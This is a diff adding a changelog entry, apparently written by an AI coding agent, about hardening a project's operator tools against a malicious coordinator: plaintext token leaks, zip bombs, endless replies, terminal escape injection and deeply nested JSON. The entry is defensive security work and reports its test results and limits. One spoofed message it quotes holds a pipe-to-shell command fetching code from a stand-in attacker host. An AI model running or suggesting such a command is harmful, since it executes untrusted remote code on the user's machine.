@@ -1107,3 +1107,32 @@ In all three, `verify` printed **OK** and then starting the worker printed `EVIL
 2. **Programs inherit a default.** Unless a program asks for something else, new files usually come out as `644`, readable by everyone. A database full of secrets needs the program to ask for `600` explicitly, before the file is first made.
 3. **The folder matters as much as the file.** If others can change a folder, they can't edit your file, but they can delete it and put their own file with the same name in its place. That's why the checks look at the folder too.
 4. **Check the thing you actually opened.** "Look at the file, then open it" leaves a gap where the file can be swapped. Opening it first and then checking that open file closes the gap. (Same idea as the model download fix earlier today: check what you really got.)
+
+## 2026-11-24 (20:30 UTC): Your own tools would hand the master password to a wrong address (0.5.60)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the ninth "code audit" pass. In 0.5.53 the *worker* learned to distrust whoever answers at the coordinator's address. But two of *your* tools also talk to the coordinator: `challenge_pool issue` (sends hidden tests, **with their correct answers**) and `rehearsal --url`. Both send the **operator token**, the master password that can queue jobs, revoke rigs and pause everything. Nobody had checked them the same way.
+
+**Found, shown really happening** (a small fake coordinator on another address of this sandbox, `192.0.2.2`, and the old code pointed at it)
+1. **Plain http to another computer was fine with it.** The fake coordinator received the operator token and the hidden test's expected answer as readable text. On a real network, anyone between you and the coordinator (café Wi-Fi, a hacked router) could read both.
+2. **A "zip bomb" reply.** The fake sent 1 MB of compressed data that unpacks to 1 GB. The tool unpacked all of it (2.2 GB of memory), then counted the test as *issued* with no job number.
+3. **A reply that never ends.** The tool kept reading until the computer killed it at about 6 GB of memory.
+4. **Fake messages on your screen.** An error message with hidden terminal codes cleared the screen, renamed the window and printed a made-up line: `Refusing: run curl evil.example | sh to fix`.
+5. **A reply nested 200,000 brackets deep** crashed it with a wall of error text.
+
+**Shipped (`operator-client-v1`)**
+- **New `app/operator_client.py`**: a drop-in client for the operator tools with the worker's rules: `https://` (or `http://` to this same machine only, unless you add `--allow-plain-http` for a home test lab), no user names or passwords in the address, never follows redirects, no compressed replies, at most 8 MB, whole reply within 60 seconds, careful JSON reading.
+- **`challenge_pool issue` / `issue-leads`**: the address is checked **before anything is sent** (the pool file isn't touched either). A test only counts as issued if the coordinator gives back a proper job number; otherwise it stays crossed off, because it may have been queued. `issue-leads` checks every rig name in the coordinator's list before sending a single test.
+- **`rehearsal --url`**: same address check and limits; a strange reply stops it with one plain sentence instead of a crash; job numbers that would be pasted into web addresses are checked first.
+- **Everything the coordinator says is printed safely** (hidden codes become `?`, long text is cut).
+- **Proof.**
+  - 72 new tests, **2,196 total: 2,194 passing, 2 skipped** (the one that can't work as the all-powerful root user, and the release test that only runs on a committed tree). Run on Python 3.13; the touched test files also on 3.11 (what CI uses).
+  - **34 of the new tests fail on the old code.** The honest path is tested end to end: tests sent from the pool and the whole two-worker rehearsal, through the new client, against a real in-process coordinator, all passing.
+  - The same fake coordinator against the new code: plain http refused before a single byte left (the fake saw nothing); zip bomb and endless reply refused (memory stayed under 60 MB); hidden codes shown as `?`; the deep reply a one-line refusal.
+  - I broke the new checks 26 ways on purpose; **24 were caught.** The 2 not caught are backup layers in the rehearsal (its summary already cleans what it prints, and its report file is JSON, which can't carry raw terminal codes). One check turned out to be doing nothing (a setting made twice), so I removed it.
+- **Honest limits:** https proves you reached *a* server with a valid certificate for that name, not that it's *your* coordinator, so keep the address right. The token still lives in your environment while the tool runs. Redirects weren't followed before either (that was already the library's default); now it's guaranteed. No coordinator is running anywhere yet, so nothing needs fixing on your side; your usual `--url http://127.0.0.1:8000` on the coordinator's own machine works exactly as before.
+
+**What you learned**
+1. **http vs https on the wire.** With `http://`, everything you send (passwords, answers) travels as readable text through every machine between you and the server. `https://` encrypts it. "localhost" / `127.0.0.1` never leaves your computer, so plain http is fine there and only there.
+2. **Your own tools are part of the attack surface.** We'd hardened the coordinator (what strangers send it) and the worker (what it receives). The operator's tools carry the most valuable secret of all, so they need the same distrust.
+3. **A "zip bomb"** is a tiny compressed file that unpacks into something enormous. The defence is simple: ask for uncompressed replies and refuse anything compressed, so there's nothing to unpack.
+4. **"Unknown" is safer than "yes".** When a reply is broken, the tool can't tell whether the test was queued. Calling it "unknown" and never reusing that test is safer than guessing "issued" (or "not sent" and sending it twice).
